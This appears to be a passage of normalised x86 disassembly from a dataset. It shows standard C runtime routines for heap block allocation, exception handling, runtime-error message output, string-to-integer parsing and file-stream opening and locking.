or [ eax ] edx
sub_2005f77
mov edi edi
push ebp
mov ebp esp
sub esp 0x14
mov eax [ rw-data ]
mov ecx [ ebp + 0x8 ]
imul eax eax 0x14
add eax [ rw-data ]
add ecx 0x17
and ecx 0xfffffff0
mov [ ebp - 0x10 ] ecx
sar ecx 0x4
push ebx
dec ecx
cmp ecx 0x20
push esi
push edi
jge r-xdata
add ecx 0xffffffe0
or edx 0xffffffff
xor esi esi
shr edx cl
mov [ ebp - 0x8 ] edx
or esi 0xffffffff
shr esi cl
or [ ebp - 0x8 ] 0xffffffff
jmp r-xdata
mov [ ebp + 0x8 ] ebx
cmp ebx eax
jb r-xdata
mov ecx [ rw-data ]
mov ebx ecx
jmp r-xdata
mov edx [ ebx + 0x4 ]
mov edi [ ebx ]
and edx [ ebp - 0x8 ]
and edi esi
or edx edi
jne r-xdata
cmp ebx eax
jne r-xdata
add ebx 0x14
mov [ rw-data ] ebx
mov eax [ ebx + 0x10 ]
mov edx [ eax ]
mov [ ebp - 0x4 ] edx
cmp edx 0xffffffff
je r-xdata
mov ebx [ rw-data ]
jmp r-xdata
and [ ebp - 0x4 ] 0x0
mov edx [ eax + 0xc4 ]
lea ecx [ eax + 0x44 ]
mov ecx [ eax + edx * 4 + 0xc4 ]
mov edi [ eax + edx * 4 + 0x44 ]
and ecx [ ebp - 0x8 ]
and edi esi
or ecx edi
jne r-xdata
mov [ ebp + 0x8 ] ebx
cmp ebx ecx
jb r-xdata
mov edx [ ebp - 0x4 ]
inc [ ebp - 0x4 ]
mov edx [ ecx + 0x84 ]
add ecx 0x4
jmp r-xdata
mov ecx edx
imul ecx ecx 0x204
lea ecx [ ecx + eax + 0x144 ]
mov [ ebp - 0xc ] ecx
mov ecx [ eax + edx * 4 + 0x44 ]
xor edi edi
and ecx esi
jne r-xdata
mov edx [ ebx + 0x4 ]
mov edi [ ebx ]
and edx [ ebp - 0x8 ]
and edi esi
or edx edi
jne r-xdata
cmp ebx ecx
jne r-xdata
test ecx ecx
jge r-xdata
mov ecx [ eax + edx * 4 + 0xc4 ]
and ecx [ ebp - 0x8 ]
push 0x20
pop edi
jmp r-xdata
mov edi [ ecx ]
and edx [ ebp - 0x8 ]
and edi esi
or edx edi
jne r-xdata
add ebx 0x14
jmp r-xdata
add ecx ecx
inc edi
mov ecx [ ebp - 0xc ]
mov edx [ ecx + edi * 8 + 0x4 ]
mov ecx [ edx ]
sub ecx [ ebp - 0x10 ]
mov esi ecx
sar esi 0x4
dec esi
cmp esi 0x3f
mov [ ebp - 0x8 ] ecx
jle r-xdata
cmp ebx eax
jb r-xdata
cmp esi edi
je r-xdata
push 0x3f
pop esi
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
cmp ebx eax
jne r-xdata
test ecx ecx
je r-xdata
mov ecx [ edx + 0x4 ]
cmp ecx [ edx + 0x8 ]
jne r-xdata
add ebx 0x14
mov [ ebp + 0x8 ] ebx
push ebx
call sub_2005b8e
pop ecx
mov ecx [ ebx + 0x10 ]
mov [ ecx ] eax
mov eax [ ebx + 0x10 ]
cmp [ eax ] 0xffffffff
je r-xdata
mov ebx [ rw-data ]
jmp r-xdata
mov esi [ ebp - 0x10 ]
add edx ecx
lea ecx [ esi + 0x1 ]
mov [ edx ] ecx
mov [ edx + esi - 0x4 ] ecx
mov esi [ ebp - 0xc ]
mov ecx [ esi ]
lea edi [ ecx + 0x1 ]
mov [ esi ] edi
test ecx ecx
jne r-xdata
mov [ edx ] ecx
mov [ ecx + edx - 0x4 ] ecx
jmp r-xdata
cmp [ ebp - 0x8 ] 0x0
mov ecx [ edx + 0x8 ]
mov edi [ edx + 0x4 ]
mov [ ecx + 0x4 ] edi
mov ecx [ edx + 0x4 ]
mov edi [ edx + 0x8 ]
mov [ ecx + 0x8 ] edi
je r-xdata
cmp edi 0x20
mov ebx 0x80000000
jge r-xdata
xor eax eax
jmp r-xdata
mov [ ebp + 0x8 ] ebx
cmp ebx ecx
jb r-xdata
mov ecx [ ebp - 0x4 ]
mov [ eax ] ecx
lea eax [ edx + 0x4 ]
cmp ebx [ rw-data ]
jne r-xdata
mov ecx [ ebp - 0x8 ]
mov ecx [ ebp - 0xc ]
lea ecx [ ecx + esi * 8 ]
mov edi [ ecx + 0x4 ]
mov [ edx + 0x8 ] ecx
mov [ edx + 0x4 ] edi
mov [ ecx + 0x4 ] edx
mov ecx [ edx + 0x4 ]
mov [ ecx + 0x8 ] edx
mov ecx [ edx + 0x4 ]
cmp ecx [ edx + 0x8 ]
jne r-xdata
lea ecx [ edi - 0x20 ]
shr ebx cl
mov ecx [ ebp - 0x4 ]
lea ecx [ eax + ecx * 4 + 0xc4 ]
lea edi [ eax + edi + 0x4 ]
not ebx
and [ ecx ] ebx
dec [ edi ]
mov [ ebp - 0x14 ] ebx
jne r-xdata
mov ecx edi
shr ebx cl
mov ecx [ ebp - 0x4 ]
lea edi [ eax + edi + 0x4 ]
not ebx
mov [ ebp - 0x14 ] ebx
and ebx [ eax + ecx * 4 + 0x44 ]
mov [ eax + ecx * 4 + 0x44 ] ebx
dec [ edi ]
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
cmp ebx ecx
jne r-xdata
mov ecx [ ebp - 0x4 ]
cmp ecx [ rw-data ]
jne r-xdata
mov ecx [ ebp - 0x8 ]
mov cl [ esi + eax + 0x4 ]
mov [ ebp + 0xb ] cl
inc cl
cmp esi 0x20
mov [ esi + eax + 0x4 ] cl
jge r-xdata
mov ebx [ ebp + 0x8 ]
mov ebx [ ebp + 0x8 ]
mov ecx [ ebp - 0x14 ]
and [ ebx + 0x4 ] ecx
jmp r-xdata
mov ecx [ ebp - 0x14 ]
mov ebx [ ebp + 0x8 ]
and [ ebx ] ecx
jmp r-xdata
add ebx 0x14
call sub_2005ade
mov ebx eax
mov [ ebp + 0x8 ] ebx
test ebx ebx
jne r-xdata
and [ rw-data ] 0x0
cmp [ ebp + 0xb ] 0x0
jne r-xdata
cmp [ ebp + 0xb ] 0x0
jne r-xdata
mov ecx [ ebp - 0x4 ]
lea edi [ eax + ecx * 4 + 0xc4 ]
lea ecx [ esi - 0x20 ]
mov esi 0x80000000
shr esi cl
or [ edi ] esi
lea ecx [ esi - 0x20 ]
mov edi 0x80000000
shr edi cl
or [ ebx + 0x4 ] edi
mov ecx esi
mov edi 0x80000000
shr edi cl
mov ecx [ ebp - 0x4 ]
or [ eax + ecx * 4 + 0x44 ] edi
jmp r-xdata
mov edi 0x80000000
mov ecx esi
shr edi cl
or [ ebx ] edi
sub_200625c
push sub_20062c0
push [ fs : 0x0 ]
mov eax [ esp + 0x10 ]
mov [ esp + 0x10 ] ebp
lea ebp [ esp + 0x10 ]
sub esp eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor [ ebp - 0x4 ] eax
xor eax ebp
push eax
mov [ ebp - 0x18 ] esp
push [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x4 ] 0xfffffffe
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x10 ]
mov [ fs : 0x0 ] eax
retn
sub_20062c0
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi [ ebx + 0x8 ]
xor esi [ rw-data ]
push edi
mov eax [ esi ]
mov [ ebp - 0x1 ] 0x0
mov [ ebp - 0xc ] 0x1
lea edi [ ebx + 0x10 ]
cmp eax 0xfffffffe
je r-xdata
mov ecx [ esi + 0xc ]
mov eax [ esi + 0x8 ]
add ecx edi
xor ecx [ eax + edi ]
call sub_2002d91
mov eax [ ebp + 0x8 ]
test [ eax + 0x4 ] 0x66
jne r-xdata
mov ecx [ esi + 0x4 ]
add ecx edi
xor ecx [ eax + edi ]
call sub_2002d91
mov edx 0xfffffffe
cmp [ ebx + 0xc ] edx
je r-xdata
mov ecx [ ebp + 0x10 ]
lea edx [ ebp - 0x18 ]
mov [ ebx - 0x4 ] edx
mov ebx [ ebx + 0xc ]
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] ecx
cmp ebx 0xfffffffe
je r-xdata
mov eax [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push rw-data
push edi
mov ecx ebx
call sub_200708c
jmp r-xdata
lea ecx [ ecx ]
mov eax [ esi ]
cmp eax 0xfffffffe
je r-xdata
mov ebx eax
cmp eax 0xfffffffe
jne r-xdata
mov edx edi
call sub_2007042
mov [ ebp - 0x1 ] 0x1
test eax eax
jl r-xdata
mov ecx [ esi + 0xc ]
mov edx [ esi + 0x8 ]
add ecx edi
xor ecx [ edx + edi ]
call sub_2002d91
mov ecx [ esi + 0x4 ]
add ecx edi
xor ecx [ eax + edi ]
call sub_2002d91
lea eax [ ebx + ebx * 2 ]
mov ecx [ esi + eax * 4 + 0x14 ]
lea eax [ esi + eax * 4 + 0x10 ]
mov [ ebp - 0x10 ] eax
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
test ecx ecx
je r-xdata
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov [ ebp - 0xc ] 0x0
jmp r-xdata
jg r-xdata
mov ecx [ ebp + 0x8 ]
cmp [ ecx ] 0xe06d7363
jne r-xdata
mov eax [ ebp - 0x8 ]
mov ecx [ ebp + 0xc ]
call sub_2007072
mov eax [ ebp + 0xc ]
cmp [ eax + 0xc ] ebx
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov ecx [ ebp - 0x8 ]
mov [ eax + 0xc ] ecx
mov eax [ esi ]
cmp eax 0xfffffffe
je r-xdata
push rw-data
push edi
mov edx ebx
mov ecx eax
call sub_200708c
mov eax [ ebp + 0xc ]
push rw-data
call sub_200acb0
add esp 0x4
test eax eax
je r-xdata
mov ecx [ esi + 0xc ]
mov edx [ esi + 0x8 ]
add ecx edi
xor ecx [ edx + edi ]
call sub_2002d91
mov eax [ ebp - 0x10 ]
mov ecx [ eax + 0x8 ]
mov edx edi
call sub_2007059
mov ecx [ esi + 0x4 ]
add ecx edi
xor ecx [ eax + edi ]
call sub_2002d91
mov edx [ ebp + 0x8 ]
push 0x1
push edx
call [ rw-data ]
add esp 0x8
sub_200644c
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push ebx
mov ebx [ ebp + 0x8 ]
push esi
push edi
xor esi esi
xor edi edi
mov [ ebp - 0x4 ] edi
cmp edi 0x17
jae r-xdata
inc edi
mov [ ebp - 0x4 ] edi
cmp edi 0x17
jb r-xdata
pop edi
pop esi
pop ebx
leave
retn
push 0x3
call sub_200c41e
pop ecx
cmp eax 0x1
je r-xdata
cmp ebx [ edi * 8 + rw-data ]
je r-xdata
push 0xfffffff4
call [ GetStdHandle@IAT ]
mov ebx eax
cmp ebx esi
je r-xdata
push 0x3
call sub_200c41e
pop ecx
test eax eax
jne r-xdata
cmp ebx 0xffffffff
je r-xdata
cmp ebx 0xfc
je r-xdata
cmp [ rw-data ] 0x1
je r-xdata
push 0x0
lea eax [ ebp - 0x8 ]
push eax
lea esi [ edi * 8 + rw-data ]
push [ esi ]
call sub_2009070
pop ecx
push eax
push [ esi ]
push ebx
call [ WriteFile@IAT ]
push r--data
mov ebx 0x314
push ebx
mov edi rw-data
push edi
call sub_2001ec1
add esp 0xc
test eax eax
je r-xdata
push 0x104
mov esi rw-data
push esi
push 0x0
mov [ rw-data ] 0x0
call [ GetModuleFileNameA@IAT ]
test eax eax
jne r-xdata
push esi
push esi
push esi
push esi
push esi
call sub_200463e
add esp 0x14
push esi
call sub_2009070
inc eax
pop ecx
cmp eax 0x3c
jbe r-xdata
push r--data
push 0x2fb
push esi
call sub_2001ec1
add esp 0xc
test eax eax
je r-xdata
xor esi esi
push esi
call sub_2009070
sub esi 0x3b
add eax esi
push 0x3
mov ecx rw-data
push r--data
sub ecx eax
push ecx
push eax
call sub_200b916
add esp 0x14
test eax eax
je r-xdata
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_200463e
add esp 0x14
mov eax [ ebp - 0x4 ]
push [ eax * 8 + rw-data ]
push ebx
push edi
call sub_200249a
add esp 0xc
test eax eax
je r-xdata
push esi
push esi
push esi
push esi
push esi
call sub_200463e
add esp 0x14
xor esi esi
push esi
push esi
push esi
push esi
push esi
call sub_200463e
add esp 0x14
jmp r-xdata
push 0x12010
push r--data
push edi
call sub_200c2b5
add esp 0xc
jmp r-xdata
push esi
push esi
push esi
push esi
push esi
call sub_200463e
add esp 0x14
push r--data
push ebx
push edi
call sub_200249a
add esp 0xc
test eax eax
je r-xdata
sub_20065f7
push 0x3
call sub_200c41e
pop ecx
cmp eax 0x1
je r-xdata
push 0xfc
call sub_200644c
push 0xff
call sub_200644c
pop ecx
pop ecx
push 0x3
call sub_200c41e
pop ecx
test eax eax
jne r-xdata
retn
cmp [ rw-data ] 0x1
jne r-xdata
sub_200663f
mov edi edi
push ebp
mov ebp esp
push [ rw-data ]
call sub_2003ff8
pop ecx
test eax eax
je r-xdata
xor eax eax
pop ebp
retn
push [ ebp + 0x8 ]
call eax
pop ecx
test eax eax
je r-xdata
xor eax eax
inc eax
pop ebp
retn
sub_2006686
push ebx
mov ebx eax
shl eax 0x8
mov edx [ esp + 0x8 ]
test edx 0x3
je r-xdata
or ebx eax
push edi
mov eax ebx
shl ebx 0x10
push esi
or ebx eax
mov cl [ edx ]
add edx 0x1
cmp cl bl
je r-xdata
mov eax [ edx - 0x4 ]
cmp al bl
je r-xdata
and eax 0x81010100
je r-xdata
lea eax [ edx - 0x1 ]
pop ebx
retn
test cl cl
je r-xdata
lea eax [ edx - 0x4 ]
pop esi
pop edi
pop ebx
retn
test al al
je r-xdata
mov ecx [ edx ]
mov edi 0x7efefeff
mov eax ecx
mov esi edi
xor ecx ebx
add esi eax
add edi ecx
xor ecx 0xffffffff
xor eax 0xffffffff
xor ecx edi
xor eax esi
add edx 0x4
and ecx 0x81010100
jne r-xdata
and eax 0x1010100
jne r-xdata
pop ebx
xor eax eax
retn
test edx 0x3
jne r-xdata
pop esi
pop edi
cmp ah bl
je r-xdata
and esi 0x80000000
jne r-xdata
lea eax [ edx - 0x3 ]
pop esi
pop edi
pop ebx
retn
test ah ah
je r-xdata
shr eax 0x10
cmp al bl
je r-xdata
lea eax [ edx - 0x2 ]
pop esi
pop edi
pop ebx
retn
test al al
je r-xdata
cmp ah bl
je r-xdata
pop esi
pop edi
lea eax [ edx - 0x1 ]
pop ebx
retn
test ah ah
je r-xdata
jmp r-xdata
sub_200673e
mov edi edi
push ebp
mov ebp esp
sub esp 0x14
push esi
push edi
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x14 ]
call sub_200144c
mov eax [ ebp + 0x10 ]
mov esi [ ebp + 0xc ]
xor edi edi
cmp eax edi
je r-xdata
cmp esi edi
jne r-xdata
mov [ eax ] esi
cmp [ ebp + 0x14 ] edi
je r-xdata
call sub_20047ce
push edi
push edi
push edi
push edi
push edi
mov [ eax ] 0x16
call sub_2004766
add esp 0x14
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov ecx [ ebp - 0x14 ]
push ebx
mov bl [ esi ]
mov [ ebp - 0x4 ] edi
lea edi [ esi + 0x1 ]
cmp [ ebp + 0x14 ] 0x2
jl r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0xc ]
and [ eax + 0x70 ] 0xfffffffd
mov edx [ ecx + 0xc8 ]
movzx eax bl
movzx eax [ edx + eax * 2 ]
and eax 0x8
lea eax [ ebp - 0x14 ]
push eax
movzx eax bl
push 0x8
push eax
call sub_200898a
mov ecx [ ebp - 0x14 ]
add esp 0xc
jmp r-xdata
cmp [ ebp + 0x14 ] 0x24
jg r-xdata
pop edi
pop esi
leave
retn
cmp bl 0x2d
jne r-xdata
mov bl [ edi ]
inc edi
jmp r-xdata
test eax eax
je r-xdata
cmp bl 0x2b
jne r-xdata
or [ ebp + 0x18 ] 0x2
jmp r-xdata
cmp [ ecx + 0xac ] 0x1
jle r-xdata
mov eax [ ebp + 0x14 ]
test eax eax
jl r-xdata
mov bl [ edi ]
inc edi
mov eax [ ebp + 0x10 ]
test eax eax
je r-xdata
cmp eax 0x1
je r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov [ eax ] esi
cmp eax 0x24
jg r-xdata
xor eax eax
mov eax [ ebp - 0xc ]
and [ eax + 0x70 ] 0xfffffffd
test eax eax
jne r-xdata
cmp eax 0x10
jne r-xdata
cmp bl 0x30
je r-xdata
mov esi [ ecx + 0xc8 ]
mov eax 0xffffffff
xor edx edx
div [ ebp + 0x14 ]
cmp bl 0x30
jne r-xdata
mov al [ edi ]
cmp al 0x78
je r-xdata
mov [ ebp + 0x14 ] 0xa
jmp r-xdata
test ecx 0x103
je r-xdata
movsx ecx bl
sub ecx 0x30
jmp r-xdata
mov al [ edi ]
cmp al 0x78
je r-xdata
mov [ ebp + 0x14 ] 0x10
jmp r-xdata
cmp al 0x58
je r-xdata
mov eax [ ebp + 0x18 ]
dec edi
test al 0x8
jne r-xdata
mov cl bl
sub cl 0x61
cmp cl 0x19
movsx ecx bl
ja r-xdata
cmp ecx [ ebp + 0x14 ]
jae r-xdata
inc edi
mov bl [ edi ]
inc edi
cmp al 0x58
jne r-xdata
mov [ ebp + 0x14 ] 0x8
jmp r-xdata
mov esi 0x7fffffff
test al 0x4
jne r-xdata
cmp [ ebp + 0x10 ] 0x0
je r-xdata
add ecx 0xffffffc9
sub ecx 0x20
or [ ebp + 0x18 ] 0x8
cmp [ ebp - 0x4 ] eax
jb r-xdata
call sub_20047ce
test [ ebp + 0x18 ] 0x1
mov [ eax ] 0x22
je r-xdata
test al 0x1
jne r-xdata
and [ ebp - 0x4 ] 0x0
jmp r-xdata
mov edi [ ebp + 0xc ]
mov ebx [ ebp - 0x4 ]
imul ebx [ ebp + 0x14 ]
add ebx ecx
mov [ ebp - 0x4 ] ebx
jne r-xdata
test [ ebp + 0x18 ] 0x2
push 0x0
pop eax
setne al
add eax esi
mov [ ebp - 0x4 ] eax
or [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
mov eax [ ebp + 0x10 ]
test eax eax
je r-xdata
and eax 0x2
je r-xdata
movzx ecx bl
movzx ecx [ esi + ecx * 2 ]
test cl 0x4
je r-xdata
or [ ebp + 0x18 ] 0x4
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
cmp ecx edx
jbe r-xdata
test [ ebp + 0x18 ] 0x2
je r-xdata
mov [ eax ] edi
test eax eax
jne r-xdata
cmp [ ebp - 0x4 ] 0x80000000
ja r-xdata
mov bl [ edi ]
inc edi
jmp r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
neg [ ebp - 0x4 ]
cmp [ ebp - 0x4 ] esi
jbe r-xdata
mov eax [ ebp - 0x4 ]
jmp r-xdata
mov eax [ ebp - 0xc ]
and [ eax + 0x70 ] 0xfffffffd
pop ebx
sub_200696d
mov edi edi
push ebp
mov ebp esp
xor eax eax
push eax
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
cmp [ rw-data ] eax
jne r-xdata
push eax
push rw-data
jmp r-xdata
call sub_200673e
add esp 0x14
pop ebp
retn
sub_200699e
mov eax [ rw-data ]
push esi
push 0x14
pop esi
test eax eax
jne r-xdata
cmp eax esi
jge r-xdata
mov eax 0x200
jmp r-xdata
push 0x4
push eax
call sub_200b579
pop ecx
pop ecx
mov [ rw-data ] eax
test eax eax
jne r-xdata
mov eax esi
mov [ rw-data ] eax
xor edx edx
mov ecx rw-data
jmp r-xdata
push 0x4
push esi
mov [ rw-data ] esi
call sub_200b579
pop ecx
pop ecx
mov [ rw-data ] eax
test eax eax
jne r-xdata
mov [ edx + eax ] ecx
add ecx 0x20
add edx 0x4
cmp ecx rw-data
jl r-xdata
push 0x1a
pop eax
pop esi
retn
mov eax [ rw-data ]
push 0xfffffffe
pop esi
xor edx edx
mov ecx rw-data
push edi
mov [ ecx ] esi
cmp eax esi
je r-xdata
mov eax edx
sar eax 0x5
mov eax [ eax * 4 + rw-data ]
mov edi edx
and edi 0x1f
shl edi 0x6
mov eax [ edi + eax ]
cmp eax 0xffffffff
je r-xdata
pop edi
xor eax eax
pop esi
retn
test eax eax
jne r-xdata
add ecx 0x20
inc edx
cmp ecx rw-data
jl r-xdata
sub_2006a6f
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
mov eax rw-data
cmp esi eax
jb r-xdata
add esi 0x20
push esi
call [ EnterCriticalSection@IAT ]
cmp esi rw-data
ja r-xdata
mov ecx esi
sub ecx eax
sar ecx 0x5
add ecx 0x10
push ecx
call sub_2005765
or [ esi + 0xc ] 0x8000
pop ecx
jmp r-xdata
pop esi
pop ebp
retn
sub_2006ab0
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp eax 0x14
jge r-xdata
mov eax [ ebp + 0xc ]
add eax 0x20
push eax
call [ EnterCriticalSection@IAT ]
pop ebp
retn
add eax 0x10
push eax
call sub_2005765
mov eax [ ebp + 0xc ]
or [ eax + 0xc ] 0x8000
pop ecx
pop ebp
retn
sub_2006ae2
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx rw-data
cmp eax ecx
jb r-xdata
add eax 0x20
push eax
call [ LeaveCriticalSection@IAT ]
pop ebp
retn
cmp eax rw-data
ja r-xdata
and [ eax + 0xc ] 0xffff7fff
sub eax ecx
sar eax 0x5
add eax 0x10
push eax
call sub_200568b
pop ecx
pop ebp
retn
sub_2006b1e
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
cmp ecx 0x14
mov eax [ ebp + 0xc ]
jge r-xdata
add eax 0x20
push eax
call [ LeaveCriticalSection@IAT ]
pop ebp
retn
and [ eax + 0xc ] 0xffff7fff
add ecx 0x10
push ecx
call sub_200568b
pop ecx
pop ebp
retn
sub_2006b4d
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
mov eax [ rw-data ]
push ebx
xor ebx ebx
push esi
mov esi [ ebp + 0xc ]
mov [ ebp - 0x4 ] eax
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x10 ] ebx
jmp r-xdata
cmp [ esi ] 0x20
je r-xdata
inc esi
mov al [ esi ]
cmp al 0x61
je r-xdata
mov [ ebp + 0xc ] 0x109
cmp al 0x72
je r-xdata
cmp [ esi ] 0x20
je r-xdata
lea edx [ ecx + 0x7f ]
mov edi 0x4000
or [ ebp - 0x4 ] 0x1
mov [ ebp + 0xc ] ebx
jmp r-xdata
cmp al 0x77
je r-xdata
inc esi
cmp [ esi ] bl
je r-xdata
cmp [ ebp - 0x10 ] ebx
je r-xdata
movsx eax al
cmp eax 0x53
jg r-xdata
xor ecx ecx
inc ecx
inc esi
mov al [ esi ]
push edi
cmp al bl
je r-xdata
mov [ ebp + 0xc ] 0x301
jmp r-xdata
call sub_20047ce
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_2004766
add esp 0x14
xor eax eax
jmp r-xdata
push 0x180
push [ ebp + 0x10 ]
lea eax [ ebp - 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push eax
call sub_200cd2e
add esp 0x14
test eax eax
je r-xdata
call sub_20047ce
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_2004766
add esp 0x14
jmp r-xdata
jmp r-xdata
sub eax 0x54
je r-xdata
je r-xdata
or [ ebp - 0x4 ] 0x2
pop esi
pop ebx
leave
retn
mov eax [ ebp + 0x14 ]
inc [ rw-data ]
mov ecx [ ebp - 0x4 ]
mov [ eax + 0xc ] ecx
mov ecx [ ebp - 0x10 ]
mov [ eax + 0x4 ] ebx
mov [ eax ] ebx
mov [ eax + 0x8 ] ebx
mov [ eax + 0x1c ] ebx
mov [ eax + 0x10 ] ecx
xor eax eax
jmp r-xdata
cmp [ esi ] 0x20
je r-xdata
test [ ebp + 0xc ] 0x1000
je r-xdata
sub eax 0xe
je r-xdata
cmp [ ebp - 0x8 ] ebx
jne r-xdata
sub eax 0x20
je r-xdata
pop edi
inc esi
push 0x3
push esi
push r--data
call sub_200ceb8
add esp 0xc
test eax eax
jne r-xdata
or [ ebp + 0xc ] 0x1000
xor ecx ecx
jmp r-xdata
test [ ebp + 0xc ] 0xc000
jne r-xdata
dec eax
je r-xdata
or [ ebp + 0xc ] 0x20
mov [ ebp - 0x8 ] 0x1
jmp r-xdata
inc esi
mov al [ esi ]
cmp al bl
jne r-xdata
sub eax 0xb
je r-xdata
add esi 0x3
jmp r-xdata
cmp ecx ebx
je r-xdata
or [ ebp + 0xc ] 0x8000
jmp r-xdata
cmp [ ebp - 0xc ] ebx
jne r-xdata
sub eax 0xb
je r-xdata
test [ ebp + 0xc ] 0x2
jne r-xdata
dec eax
je r-xdata
cmp [ esi ] 0x20
je r-xdata
or [ ebp - 0x4 ] edi
mov [ ebp - 0xc ] 0x1
jmp r-xdata
cmp [ ebp - 0xc ] ebx
jne r-xdata
sub eax 0x6
jne r-xdata
mov eax [ ebp + 0xc ]
and eax 0xfffffffe
or eax 0x2
mov [ ebp + 0xc ] eax
mov eax [ ebp - 0x4 ]
and eax 0xfffffffc
or eax edx
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov [ ebp - 0x10 ] 0x1
jmp r-xdata
sub eax 0x18
je r-xdata
inc esi
cmp [ esi ] 0x3d
jne r-xdata
and [ ebp - 0x4 ] 0xffffbfff
mov [ ebp - 0xc ] 0x1
jmp r-xdata
test [ ebp + 0xc ] 0xc000
jne r-xdata
test [ ebp + 0xc ] 0x40
jne r-xdata
sub eax 0xa
je r-xdata
inc esi
cmp [ esi ] 0x20
je r-xdata
or [ ebp + 0xc ] edi
jmp r-xdata
or [ ebp + 0xc ] 0x40
jmp r-xdata
or [ ebp + 0xc ] edx
jmp r-xdata
sub eax 0x4
jne r-xdata
push 0x5
push r--data
push esi
call sub_200355b
add esp 0xc
test eax eax
jne r-xdata
cmp [ ebp - 0x8 ] ebx
jne r-xdata
push 0x8
push r--data
push esi
call sub_200355b
add esp 0xc
test eax eax
jne r-xdata
add esi 0x5
or [ ebp + 0xc ] 0x40000
jmp r-xdata
or [ ebp + 0xc ] 0x10
mov [ ebp - 0x8 ] 0x1
jmp r-xdata
push 0x7
push r--data
push esi
call sub_200355b
add esp 0xc
test eax eax
jne r-xdata
add esi 0x8
or [ ebp + 0xc ] 0x20000
jmp r-xdata
add esi 0x7
or [ ebp + 0xc ] 0x10000
jmp r-xdata
sub_2006e16
push 0x10
push r--data
call sub_200625c
xor ebx ebx
xor edi edi
mov [ ebp - 0x1c ] edi
push 0x1
call sub_2005765
pop ecx
mov [ ebp - 0x4 ] ebx
xor esi esi
cmp edi ebx
je r-xdata
mov eax [ rw-data ]
lea eax [ eax + esi * 4 ]
cmp [ eax ] ebx
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_2006f45
mov eax edi
call sub_20062a1
retn
and [ edi + 0xc ] 0x8000
mov [ edi + 0x4 ] ebx
mov [ edi + 0x8 ] ebx
mov [ edi ] ebx
mov [ edi + 0x1c ] ebx
or [ edi + 0x10 ] 0xffffffff
shl esi 0x2
push 0x38
call sub_200b534
pop ecx
mov ecx [ rw-data ]
mov [ esi + ecx ] eax
mov eax [ rw-data ]
add eax esi
cmp [ eax ] ebx
je r-xdata
mov eax [ eax ]
mov eax [ eax + 0xc ]
test al 0x83
jne r-xdata
push 0xfa0
mov eax [ eax ]
add eax 0x20
push eax
call sub_200aff6
pop ecx
pop ecx
test eax eax
mov eax [ rw-data ]
jne r-xdata
inc esi
jmp r-xdata
test eax 0x8000
jne r-xdata
mov eax [ esi + eax ]
add eax 0x20
push eax
call [ EnterCriticalSection@IAT ]
mov eax [ rw-data ]
mov edi [ esi + eax ]
mov [ ebp - 0x1c ] edi
mov [ edi + 0xc ] ebx
push [ esi + eax ]
call sub_20016b0
pop ecx
mov eax [ rw-data ]
mov [ esi + eax ] ebx
jmp r-xdata
mov [ ebp - 0x20 ] esi
cmp esi [ rw-data ]
jge r-xdata
lea eax [ esi - 0x3 ]
cmp eax 0x10
ja r-xdata
mov eax [ rw-data ]
push [ eax + esi * 4 ]
push esi
call sub_2006ab0
pop ecx
pop ecx
mov eax [ rw-data ]
mov eax [ eax + esi * 4 ]
test [ eax + 0xc ] 0x83
je r-xdata
lea eax [ esi + 0x10 ]
push eax
call sub_20056a2
pop ecx
test eax eax
je r-xdata
mov edi eax
mov [ ebp - 0x1c ] edi
jmp r-xdata
push eax
push esi
call sub_2006b1e
pop ecx
pop ecx
sub_2006f50
push ebx
push esi
push edi
mov edx [ esp + 0x10 ]
mov eax [ esp + 0x14 ]
mov ecx [ esp + 0x18 ]
push ebp
push edx
push eax
push ecx
push ecx
push sub_2006fe0
push [ fs : 0x0 ]
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x8 ] eax
mov [ fs : 0x0 ] esp
pop [ fs : 0x0 ]
add esp 0x18
pop edi
pop esi
pop ebx
retn
mov edx [ esp + 0x34 ]
cmp edx 0xfffffffe
je r-xdata
lea esi [ esi + esi * 2 ]
lea ebx [ ebx + esi * 4 + 0x10 ]
mov ecx [ ebx ]
mov [ eax + 0xc ] ecx
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
cmp esi edx
jbe r-xdata
mov eax [ esp + 0x30 ]
mov ebx [ eax + 0x8 ]
mov ecx [ esp + 0x2c ]
xor ebx [ ecx ]
mov esi [ eax + 0xc ]
cmp esi 0xfffffffe
je r-xdata
push 0x101
mov eax [ ebx + 0x8 ]
call sub_200cfe9
mov ecx 0x1
mov eax [ ebx + 0x8 ]
